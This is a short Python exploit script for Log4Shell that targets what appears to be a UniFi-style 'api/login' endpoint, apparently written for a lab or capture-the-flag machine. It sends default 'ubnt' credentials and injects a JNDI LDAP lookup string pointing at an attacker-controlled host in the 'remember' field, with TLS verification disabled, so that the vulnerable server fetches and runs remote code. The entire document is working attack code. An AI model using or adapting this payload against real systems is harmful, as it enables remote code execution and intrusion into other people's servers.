#!/usr/bin/python3


from pwn import *
import requests
import sys
from pprint import pprint
# to avoid exceptions
# when we trying to use the send by ssl
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def log4shell_explotation(url):

    sess = requests.session()
    print(url+"api/login")
    payload_data = {"username": "ubnt", "password": "ubnt",
            "remember": "${jndi:ldap://10.10.15.105:1389/o=tomcat}", "strict": "true"}

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0'
    }

    ress = sess.post(url=url+"api/login", json=payload_data,
                     headers=headers, verify=False)
    pprint(ress.json())


def main():
    try:
        url = sys.argv[1]
        log4shell_explotation(url)
    except Exception as e:
        print(str(e))
        log.failure('problems trying to get the url by cmd')
        exit(1)
    except KeyboardInterrupt:
        exit(0)


if __name__ == "__main__":
    main()
